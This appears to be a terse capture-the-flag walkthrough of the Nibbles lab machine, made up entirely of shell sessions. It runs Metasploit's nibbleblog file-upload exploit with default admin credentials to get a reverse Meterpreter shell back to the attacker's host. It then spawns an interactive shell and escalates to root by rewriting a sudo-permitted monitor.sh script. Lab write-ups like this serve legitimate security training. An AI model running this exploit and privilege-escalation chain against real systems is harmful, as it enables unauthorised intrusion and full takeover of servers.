```shell-session
msf6 > use exploit/multi/http/nibbleblog_file_upload
msf6 exploit(multi/http/nibbleblog_file_upload) > set LHOST 10.10.15.88
LHOST => 10.10.15.88
msf6 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
PASSWORD => nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.129.211.176
RHOSTS => 10.129.211.176
msf6 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog/
TARGETURI => /nibbleblog/
```

```shell-session
meterpreter > shell
Process 16673 created.
Channel 0 created.
whoami

nibbler
```

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ export TERM=xterm   
```
    
```
cat /home/nibbler/user.txt
```

```shell
unzip personal.zip
```
```shell-session
echo "cat /root/root.txt" > personal/stuff/monitor.sh

sudo ./personal/stuff/monitor.sh
```

